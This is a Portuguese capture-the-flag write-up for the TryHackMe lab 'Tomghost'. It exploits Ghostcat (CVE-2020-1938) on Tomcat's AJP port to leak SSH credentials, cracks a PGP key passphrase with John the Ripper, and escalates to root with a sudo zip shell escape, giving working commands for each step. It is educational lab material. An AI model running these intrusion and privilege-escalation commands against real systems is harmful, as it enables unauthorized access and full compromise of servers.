---
title: "Tomghost"
date: 2026-05-24
summary: "Exploração da vulnerabilidade Ghostcat, acesso SSH, quebra de chave PGP e sudo com zip."
platform: "TryHackMe"
difficulty: "Fácil"
os: "Linux"
tags: ["Ghostcat", "Tomcat", "PGP", "Sudo"]
draft: false
---

## Visão Geral

A máquina Tomghost apresenta um cenário clássico de exploração de falhas em servidores de aplicação Java, movimentação lateral por meio de análise criptográfica e escalada de privilégios via abusos em utilitários do sistema operacional Unix.

O vetor de ataque inicial concentra-se no protocolo AJP do Apache Tomcat, explorando a vulnerabilidade conhecida como *Ghostcat* (CVE-2020-1938), a qual possibilita a leitura arbitrária de arquivos locais sem autenticação. A partir disso, obtêm-se credenciais iniciais que garantem acesso remoto via SSH. A segunda etapa envolve movimentação lateral através do extermínio de chaves PGP protegidas por senha utilizando força bruta. Por fim, a elevação de privilégios para o usuário administrador (`root`) é executada explorando configurações inseguras do comando `sudo` atreladas ao binário `zip`.

## Reconhecimento

O processo de auditoria foi iniciado com o mapeamento de portas e serviços através do utilitário **Nmap**. Foram identificados quatro serviços ativos na máquina alvo.

```bash
nmap -sC -sV -v -p- <TARGET_IP>
```

![Resultado do escaneamento do Nmap indicando as portas e versões identificadas.](/images/writeups/tomghost/nmap.png)

Ao pesquisar sobre o ecossistema identificado na varredura — especificamente o **Apache Tomcat 9.0.30** —, constatou-se a existência de uma vulnerabilidade crítica catalogada como **CVE-2020-1938** (Ghostcat). Esta falha permite que invasores não autenticados realizem a leitura e inclusão de arquivos da estrutura da aplicação web ao interagir diretamente com a porta 8009, que roda o protocolo nativo *Apache Jserv* (AJP v1.3).

Para buscar códigos capazes de explorar a vulnerabilidade, empregou-se a ferramenta **Searchsploit**:

```bash
searchsploit tomcat
```

![Busca no banco do Searchsploit localizando o exploit do Ghostcat.](/images/writeups/tomghost/searchsploit-tomcat.png)

Localizou-se o script escrito em Python intitulado *"Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion"*. A execução do código apontando para a porta padrão 8009 do servidor permitiu interagir com o contêiner e extrair a leitura do arquivo de configuração estrutural `web.xml`.

*Recuperação de recurso via protocolo ajp13.*
```xml
Getting resource at ajp13://cat.thm:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
version="4.0"
metadata-complete="true">

<display-name>Welcome to Tomcat</display-name>
<description>
Welcome to GhostCat
user:password
</description>

</web-app>
```

A inspeção da tag de descrição do documento revelou um par de credenciais explícito vazado de forma insegura no código-fonte: `skyfuck:8730281lkjlkjdqlksalks`.

## Exploração

Aproveitando a porta 22 (SSH) identificada como ativa durante a varredura, realizou-se uma tentativa de autenticação remota direta utilizando as credenciais exfiltradas.

```bash
ssh skyfuck@<TARGET_IP>
```

O login foi efetuado com absoluto sucesso. Contudo, ao auditar a pasta pessoal do usuário conectado, verificou-se que o arquivo de flag inicial não estava presente em sua raiz. Executando comandos de movimentação de diretórios para explorar outros perfis locais, localizou-se a flag no diretório do usuário Merlin.

```bash
cd ..
ls
cd merlin
cat user.txt
```

Retornando ao diretório de origem (`/home/skyfuck`), constatou-se a presença de dois arquivos críticos pertencentes à estrutura de criptografia assimétrica Pretty Good Privacy (PGP): o `tryhackme.asc` (uma chave PGP/GPG exportada em formato ASCII armored) e o arquivo `credential.pgp` (um segredo criptografado com a chave pública correspondente).

![Listagem de arquivos dentro da pasta home do usuário inicial.](/images/writeups/tomghost/ls-skyfuck.png)

Para analisar e descriptografar esses arquivos de forma confortável na máquina de ataque local (Kali Linux), utilizou-se a presença do interpretador Python na máquina alvo para iniciar temporariamente um servidor HTTP de transferência de dados:

```bash
python3 -m http.server 8000
```

![Inicialização do servidor web interno do Python para exfiltração.](/images/writeups/tomghost/inicio-servidor-http.png)

Na estação local do auditor, empregou-se o comando `wget` para efetuar o download remoto de ambas as estruturas criptográficas:

```bash
wget http://<TARGET_IP>:8000/tryhackme.asc
wget http://<TARGET_IP>:8000/credential.pgp
```

![Download dos arquivos via wget no terminal local.](/images/writeups/tomghost/baixando-arquivos-http.png)

Com as chaves em mãos, o primeiro passo foi importar o bloco de chaves para o ambiente local:

```bash
gpg --import tryhackme.asc
```

Para descriptografar o conteúdo, era indispensável possuir a frase secreta (*passphrase*) de proteção da chave privada. Sendo assim, utilizou-se a suíte do John the Ripper com a diretiva **gpg2john** para extrair o hash da chave:

```bash
gpg2john tryhackme.asc > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![Processo de cracking bem-sucedido revelando a passphrase da chave PGP.](/images/writeups/tomghost/crack-john.png)

O ataque de dicionário quebrou o hash rapidamente. De posse da frase secreta revelada, invocou-se o comando nativo do `gpg` para descriptografar o arquivo `credential.pgp`. O processo descriptografou o conteúdo e expôs a senha verdadeira pertencente ao usuário Merlin. Retornando ao terminal SSH na máquina alvo, executou-se a transição de identidade:

```bash
su merlin
# [senha omitida para evitar spoilers]
whoami
# merlin
```

![Descriptografia do arquivo de senhas e transição de usuário para Merlin.](/images/writeups/tomghost/gpg-e-su-merlin.png)

## Escalada de Privilégios

Já autenticado como o usuário Merlin, realizou-se a checagem padrão de permissões administrativas no ecossistema através do comando `sudo -l`.

```bash
sudo -l
```

![Verificação das regras do sudoers permitindo executar o binário zip como root.](/images/writeups/tomghost/sudo-l.png)

A saída indicou uma falha gravíssima de segurança: o utilitário de compactação de arquivos **zip** (`/usr/bin/zip`) podia ser executado em nome do superusuário com omissão total de senha (`NOPASSWD`).

De acordo com técnicas documentadas de escape de privilégios (GTFOBins), o utilitário `zip` possui um parâmetro interno de teste de integridade estrutural (`-T`) que pode ser combinado com o comando `--unzip-command`. Esta flag dita qual instrução do sistema operacional deve processar a extração dos dados testados. Ao injetar a execução de um shell binário (`/bin/bash`) dentro desse parâmetro executado como root, o escape é concluído com sucesso.

Para disparar o gatilho, criou-se primeiramente um arquivo dummy temporário em `/tmp`:

```bash
touch /tmp/test
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
```

![Abuso do comando zip e obtenção de terminal shell administrativo.](/images/writeups/tomghost/sudo-zip.png)

O comando executou o escape com sucesso absoluto, desaguando um console instantâneo de superusuário. Com privilégio máximo na máquina, a flag final pôde ser consultada.

```bash
whoami
# root
cat /root/root.txt
```

## Conclusão

A invasão da máquina Tomghost reforça as consequências da exposição inadequada de portas administrativas e da ausência de políticas rigorosas de privilégios em sistemas Linux. A exposição do conector AJP do Tomcat na porta 8009 permitiu a exploração do Ghostcat, uma falha severa decorrente do tratamento inseguro de requisições de arquivos confidenciais pelo servidor.

Somado a isso, o armazenamento desprotegido de segredos e chaves criptográficas em diretórios home sem barreiras de isolamento entre usuários facilitou a movimentação lateral após a quebra de hash. Por fim, a cessão de permissões de `sudo` irrestritas a binários utilitários complexos como o `zip`, que contam nativamente com parâmetros de execução de subprocessos de sistema, anulou as defesas de privilégios locais e resultou no comprometimento irreversível do servidor.

## Referências

- Mitre. *CVE-2020-1938 Detail (Ghostcat File Read/Inclusion)*. Disponível em: <https://nvd.nist.gov/vuln/detail/CVE-2020-1938>.
